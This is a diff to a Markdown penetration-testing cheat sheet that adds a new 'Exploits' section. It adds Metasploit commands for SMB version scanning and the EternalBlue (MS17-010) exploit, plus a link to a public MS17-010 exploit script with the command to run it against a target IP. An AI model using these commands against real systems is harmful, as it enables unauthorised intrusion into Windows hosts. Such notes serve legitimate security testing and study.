@@ -12,6 +12,7 @@ Overview
 8. - [Reverse Shells](#8---reverse-shells)
 9. - [Online Resources](#9---online-resources)
 10. - [Browser Plugins](#10---browser-plugins)
+11. - [Exploits](#11---exploits)
      
 #1. - Enumeration
 -----------------------------------------
@@ -63,6 +64,8 @@ $ smbclient -L <IP address>
 $ smbclient -L <IP address> -U <username>
 $ smbclient \\\\<IP address>\\c$
 $ smbclient \\\\<IP address>\\c$ -U <username>
+msf> use auxiliary/scanner/smb/smb_version
+msf> use exploit/windows/smb/ms17_010_eternalblue
 ```
 
 - Rsync (port 873)
@@ -345,4 +348,14 @@ https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
 
 ```
 https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
+```
+
+#11 - Exploits
+-----------------------------------------
+
+- MS17-010
+
+```
+https://github.com/worawit/MS17-010/blob/master/zzz_exploit.py
+$ ./zzz_exploit.py <IP address> ntsvcs
 ```
